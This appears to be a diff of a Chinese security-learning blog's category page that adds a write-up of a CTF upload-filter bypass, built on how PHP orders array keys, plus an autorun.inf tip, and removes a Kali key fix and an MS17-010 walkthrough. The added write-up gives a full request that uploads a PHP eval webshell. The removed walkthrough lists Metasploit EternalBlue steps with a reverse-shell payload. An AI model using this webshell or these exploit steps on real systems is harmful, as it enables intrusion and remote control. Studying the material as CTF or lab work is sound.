@@ -79,13 +79,13 @@
 
 
 <meta property="og:type" content="website">
-<meta property="og:title" content="标签">
-<meta property="og:url" content="http://yoursite.com/tags/index.html">
+<meta property="og:title" content="分类">
+<meta property="og:url" content="http://yoursite.com/categories/index.html">
 <meta property="og:site_name" content="从零开始的学习生涯">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-01-26T04:50:25.031Z">
+<meta property="og:updated_time" content="2018-01-26T04:50:14.525Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="标签">
+<meta name="twitter:title" content="分类">
 
 
 
@@ -113,7 +113,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/"/>
+  <link rel="canonical" href="http://yoursite.com/categories/"/>
 
 
 
@@ -247,6 +247,369 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/24/PHP数组与c数组差异而引发的问题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="平贺桐人">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="从零开始的学习生涯">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/08/24/PHP数组与c数组差异而引发的问题/" itemprop="url">PHP数组与c数组差异而引发的安全问题</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-24T22:19:24+08:00">2018-08-24</time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="C语言数组"><a href="#C语言数组" class="headerlink" title="C语言数组"></a>C语言数组</h1><p><strong>C语言的数组都是由连续的内存位置组成。最低的地址对应第一个元素，最高的地址对应最后一个元素。</strong><br><img src="https://fdrag0n.github.io/image/2018-8-24 235941/arrays.jpg" alt="Alt text"><br>设有一个数组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int array[2];</span><br></pre></td></tr></table></figure>
+<p>无论是先给<code>array[0]</code>赋值,还是先给<code>array[1]</code>赋值，其在内存中的排序都是<code>array[0]</code>在前面<code>array[1]</code>在后面，所以无论是用指针指向array的最后一个单元还是直接引用<code>array[1]</code>的值,其所指的都是同一个值。</p>
+<h1 id="PHP的数组"><a href="#PHP的数组" class="headerlink" title="PHP的数组"></a>PHP的数组</h1><p><strong>而PHP数组与C语言数组不一样，PHP 中的数组实际上是一个有序映射。映射是一种把 values 关联到 keys 的类型。此类型在很多方面做了优化，因此可以把它当成真正的数组，或列表（向量），散列表（是映射的一种实现），字典，集合，栈，队列以及更多可能性。由于数组元素的值也可以是另一个数组，树形结构和多维数组也是允许的。</strong><br>贴上一个简易的上传过滤源码</p>
+<pre><code>&lt;?php
+    $file = $_GET[&apos;file&apos;];
+    if (!is_array($file)) {
+        $file = explode(&apos;.&apos;, strtolower($file));
+    }
+    print_r ($file);
+    echo &apos;&lt;/br&gt;&apos;;
+    $ext = end($file);
+    if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) {
+        print(&apos;This file is not allowed!&lt;/br&gt;&apos;);
+    }
+    else print(&apos;success!&lt;/br&gt;&apos;);
+    var_dump($file);
+    echo &apos;&lt;/br&gt;&apos;;
+    $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];
+    echo &apos;filename:&apos;.$filename;
+    echo &apos;&lt;/br&gt;&apos;;
+    echo &apos;end($file):&apos;.end($file);
+?&gt;
+</code></pre><p>如图<code>file[0]</code>和<code>file[1]</code>都是由get传参，如果先给<code>file[0]</code>赋值png，再给<code>file[1]</code>赋值php的话，会被拦截。</p>
+<pre><code>file[0]=png&amp;file[1]=php
+</code></pre><p>但是如果先给<code>file[1]</code>赋值php，再给<code>file[0]</code>赋值png的话，则可以成功绕过过滤规则上传。</p>
+<pre><code>file[1]=php&amp;file[0]=png
+</code></pre><p>演示截图：</p>
+<p><img src="https://fdrag0n.github.io/image/2018-8-24 235941/2018-8-24 231639.PNG" alt="Alt text"></p>
+<p>代码第六行和第十二行将其显示出来，由图右侧可见，如果先给<code>file[0]</code>赋值png，再给<code>file[1]</code>赋值php的话，数组是<code>Array ( [0] =&gt; png [1] =&gt; php )</code>，会被拦截。</p>
+<p>而如果先给<code>file[1]</code>赋值php，再给<code>file[0]</code>赋值png的话，数组就是<code>Array ( [1] =&gt; php [0] =&gt; png )</code> ,它所占内存区域中最后一个单元是<code>file[0]=&gt;png</code>，而<strong>不像</strong>C语言一样是file[1]，所以如果过滤代码一方面用<code>end()</code>来取出数组最后一个单元，而另外一处却用<code>$file[count($file) - 1]</code>来取出最后一个单元，就会存在有绕过的漏洞。</p>
+<h1 id="拿python来比较一下更好说明"><a href="#拿python来比较一下更好说明" class="headerlink" title="拿python来比较一下更好说明"></a>拿python来比较一下更好说明</h1><ul>
+<li>C语言的数组更像Python 列表(List)</li>
+<li>而PHP的数组像Python 字典(Dictionary)</li>
+</ul>
+<h1 id="涉及到的CTF：-网鼎杯第二场的上传题–wafUpload"><a href="#涉及到的CTF：-网鼎杯第二场的上传题–wafUpload" class="headerlink" title="涉及到的CTF： 网鼎杯第二场的上传题–wafUpload"></a>涉及到的CTF： 网鼎杯第二场的上传题–wafUpload</h1><pre><code>&lt;?php
+$sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);
+@mkdir($sandbox);
+@chdir($sandbox);
+
+if (!empty($_FILES[&apos;file&apos;])) {
+#mime check
+if (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) {
+die(&apos;This type is not allowed!&apos;);
+}
+
+#check filename
+$file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;];
+if (!is_array($file)) {
+$file = explode(&apos;.&apos;, strtolower($file));
+}
+$ext = end($file);
+if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) {
+die(&apos;This file is not allowed!&apos;);
+}
+
+$filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];
+if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) {
+echo &apos;Success!&apos;;
+echo &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename;
+} else {
+echo &apos;Failed!&apos;;
+}
+}
+show_source(__file__);
+?&gt;
+</code></pre><ul>
+<li>第8-10行mime check部分 MIME 类型检测，使用图片马绕过。</li>
+<li><p>第12-20行check filename部分 对文件后缀进行了检测，而后缀名则是取 <code>$file</code> 数组中最后一个元素。然后在生成文件的时候，文件名取<code>$file</code> 数组的最后一个元素做后缀，这明显存在绕过。我们只要控制<code>$file</code>数组中参数的即可绕过并 getshell ，请求数据包如下</p>
+<p>  POST / HTTP/1.1<br>  Host: 4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com<br>  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0<br>  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>  Accept-Encoding: gzip, deflate<br>  Referer: <a href="http://4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com/" target="_blank" rel="noopener">http://4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com/</a><br>  Content-Type: multipart/form-data; boundary=—————————9930139772306<br>  Content-Length: 524<br>  DNT: 1<br>  Connection: close<br>  Upgrade-Insecure-Requests: 1</p>
+<p>  —————————–9930139772123<br>  Content-Disposition: form-data; name=”filename[1]”</p>
+<p>  php<br>  —————————–9930139772123<br>  Content-Disposition: form-data; name=”filename[0]”</p>
+<p>  png<br>  —————————–9930139772123<br>  Content-Disposition: form-data; name=”file”; filename=”fdrag0n.jpg”<br>  Content-Type: image/jpeg</p>
+<p>  &lt;?php @eval($_POST[‘a’]);?&gt;<br>  —————————–9930139772123<br>  Content-Disposition: form-data; name=”submit”</p>
+<p>  Submit<br>  —————————–9930139772123–</p>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/13/利用autorun-inf预防自动运行病毒及个性化磁盘图标/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="平贺桐人">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="从零开始的学习生涯">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/08/13/利用autorun-inf预防自动运行病毒及个性化磁盘图标/" itemprop="url">利用autorun.inf预防自动运行病毒及个性化磁盘图标</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-13T10:37:01+08:00">2018-08-13</time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="AutoRun简介"><a href="#AutoRun简介" class="headerlink" title="AutoRun简介"></a>AutoRun简介</h1><p>  AutoRun和AutoPlay是微软窗口系统的组件，其内容标示着系统在搜索到设备时可采取的行动。</p>
+<p>  AutoRun在Windows 95时首度露面，目的是帮助用户正确运行光盘上制作者想要运行的文件，另外AutoRun也能透过双击我的计算机内的设备图标启动AutoRun。但后来U盘病毒横行，微软发布更新关闭非光盘驱动器的AutoRun。</p>
+<p>  在Windows XP之后，微软让用户方便选择相关应用程序，制作出如图形化接口方式让用户选择如何处理设备中的文件。</p>
+<h1 id="AutoRun-inf文件"><a href="#AutoRun-inf文件" class="headerlink" title="AutoRun.inf文件"></a>AutoRun.inf文件</h1><p>  autrun.inf是我们电脑使用中比较常见的文件之一 ，其作用是允许在双击磁盘时自动运行指定的某个文件。但是近几年出现了用autorun.inf文件传播木马或病毒，它通过使用者的误操作让目标程序执行，达到侵入电脑的目的，带来了很大的负面影响。</p>
+<h1 id="AutoRun-inf的示例"><a href="#AutoRun-inf的示例" class="headerlink" title="AutoRun.inf的示例"></a>AutoRun.inf的示例</h1><pre><code>[autorun] 
+open=setup.exe 
+icon=setup.exe,0
+label=My install CD
+</code></pre><p>双击盘符时会运行setup.exe，而显示图标为setup.exe中第0个图标（即第1个图标），标签是My install CD。</p>
+<h1 id="AutoRun-inf的默认激活"><a href="#AutoRun-inf的默认激活" class="headerlink" title="AutoRun.inf的默认激活"></a>AutoRun.inf的默认激活</h1><ul>
+<li>插入设备时启动。</li>
+<li>双击我的计算机设备时启动。</li>
+<li>对我的计算机设备点击右键菜单中 “AutoRun” 项目时启动。</li>
+<li>其他(如点击根目录文件夹)则不会启动。<h2 id="windows-XP-以前"><a href="#windows-XP-以前" class="headerlink" title="windows XP 以前"></a>windows XP 以前</h2></li>
+<li>所有设备都会依照 Autorun.inf 启动。<h2 id="Windows-7"><a href="#Windows-7" class="headerlink" title="Windows 7"></a>Windows 7</h2></li>
+<li>只有光盘会先运行 autorun.inf</li>
+</ul>
+<h1 id="利用autorun-inf给硬盘改图标及简易防病毒"><a href="#利用autorun-inf给硬盘改图标及简易防病毒" class="headerlink" title="利用autorun.inf给硬盘改图标及简易防病毒"></a>利用autorun.inf给硬盘改图标及简易防病毒</h1><h2 id="个性化磁盘—改图标"><a href="#个性化磁盘—改图标" class="headerlink" title="个性化磁盘—改图标"></a>个性化磁盘—改图标</h2><p>在对应磁盘的根目录新建一个记事本，然后修改里面内容</p>
+<pre><code>[AUTORUN]
+ICON=drag0n.ico
+</code></pre><p>然后将其保存为autorun.inf（注意ico的文件名字符不要超过6位）</p>
+<p>再将你想用的图标转换成ico文件，推荐分辨率不要超过48x48，然后一同放进同目录下，然后改名为fdragn.ico。</p>
+<p><img src="https://fdrag0n.github.io/image/1.png" alt=""></p>
+<h2 id="简易防病毒"><a href="#简易防病毒" class="headerlink" title="简易防病毒"></a>简易防病毒</h2><p>此时文件是显示在当前目录下的，可以使用Windows下的attrib命令给文件增加属性</p>
+<pre><code>attrib指令的格式和常用参数为
+ATTRIB [+R | -R] [+A | -A ] [+S | -S] [+H | -H] [[drive:] [path] filename] [/S [/D]]
++ 设置属性。
+- 清除属性。
+R 只读文件属性。
+A 存档文件属性。
+S 系统文件属性。
+H 隐藏文件属性。
+I 无内容索引文件属性。
+[drive:][path][filename]
+指定要处理的文件属性。
+/S 处理当前文件夹及其子文件夹中的匹配文件。
+/D 处理文件夹。
+/L 处理符号链接和符号链接目标的属性。
+</code></pre><p>所以使用</p>
+<pre><code>attrib +s +h +r autorun.inf
+</code></pre><p>给autorun.inf添加系统、隐藏和只读属性，防止病毒修改autorun.inf文件</p>
+<pre><code>attrib +s +h drag0n.ico
+</code></pre><p>给drag0n.ico文件添加系统和隐藏属性，美观。</p>
+<p><img src="https://fdrag0n.github.io/image/2.png" alt=""></p>
+<p>如果还要修改的话，使用以下命令将其显示出来</p>
+<pre><code>attrib -s -h -r autorun.inf
+
+attrib -s -h fdrag0n.ico
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
     
       
 
@@ -1441,293 +1804,6 @@ wlan0mon 启用监听模式的网卡名
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/06/kali更新源问题解决方案/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="平贺桐人">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="从零开始的学习生涯">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/02/06/kali更新源问题解决方案/" itemprop="url">kali更新源问题解决方案</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-06T12:17:06+08:00">2018-02-06</time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/kali/" itemprop="url" rel="index"><span itemprop="name">kali</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="更换apt源后显示GPG错误-签名无效等"><a href="#更换apt源后显示GPG错误-签名无效等" class="headerlink" title="更换apt源后显示GPG错误 签名无效等"></a>更换apt源后显示GPG错误 签名无效等</h3><h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><p>Kali Linux由于太长时间未更新，而出现GPG错误 KEYEXPIRED 1425567400。经检查源未出现问题可以解析，deb也不冲突，就是密钥过期了!<img src="https://s1.ax2x.com/2018/02/06/vQvfJ.png" alt=""></p>
-<h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p>具体更新方法有以下几种方法：（任选一种即可）</p>
-<pre><code>1、# apt-key adv --keyserver keys.gnupg.net --recv-keys ED444FF07D8D0BF6
-</code></pre><hr>
-<pre><code>2、# wget -q -O - archive.kali.org/archive-key.asc | apt-key add
-</code></pre><hr>
-<pre><code>3、# gpg --keyserver hkp://pgpkeys.mit.edu --recv-key ED444FF07D8D0BF6
-# gpg -a --export ED444FF07D8D0BF6 | sudo apt-key add -
-</code></pre><hr>
-<pre><code>4、# wget https://http.kali.org/kali/pool/ ... ring_2018.1_all.deb
-# apt install ./kali-archive-keyring_2018.1_all.deb
-</code></pre><p>成功更新密钥之后，我们就可以正常的 update / upgrade 了。</p>
-<p>然后在执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure></p>
-<p>即可。<br><img src="https://s1.ax2x.com/2018/02/06/vQhal.png" alt="解决"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/18/瞎搞的一次ms17-0100漏洞利用/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="平贺桐人">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="从零开始的学习生涯">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/01/18/瞎搞的一次ms17-0100漏洞利用/" itemprop="url">瞎搞的一次ms17-0100漏洞利用</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-18T10:22:42+08:00">2018-01-18</time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><h2 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h2><p><strong>gem install ruby_smb</strong><br>—-ruby_smb模块安装<br><strong>msfupdate</strong><br>—-msf的更新<br><strong>msfconsole -qx “use<br>exploit/windows/smb/ms17_010_eternalblue”</strong><br>—-启动并加载模块</p>
-<hr>
-<h2 id="部署环境："><a href="#部署环境：" class="headerlink" title="部署环境："></a>部署环境：</h2><ul>
-<li><strong>msfconsole</strong>  </li>
-<li><strong>wget <a href="https://raw.githubusercontent.com/backlion/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb" target="_blank" rel="noopener">https://raw.githubusercontent.com/backlion/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb</a></strong>  </li>
-<li><strong>cp ms17_010_eternalblue.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb</strong>  </li>
-</ul>
-<hr>
-<h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击:"></a>开始攻击:</h2><ul>
-<li><strong>msfconsole</strong></li>
-<li><strong>use exploit/windows/smb/ms17_010_eternalblue</strong> </li>
-<li><strong>set rhost 192.168.21.128</strong></li>
-<li><strong>set lhost 192.168.21.131</strong></li>
-<li><strong>set payload windows/x64/meterpreter/reverse_tcp</strong></li>
-<li><strong>exploit</strong>  </li>
-<li><strong>shell</strong></li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1775,7 +1851,7 @@ wlan0mon 启用监听模式的网卡名
                 
                   <a href="/archives">
                 
-                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-count">14</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
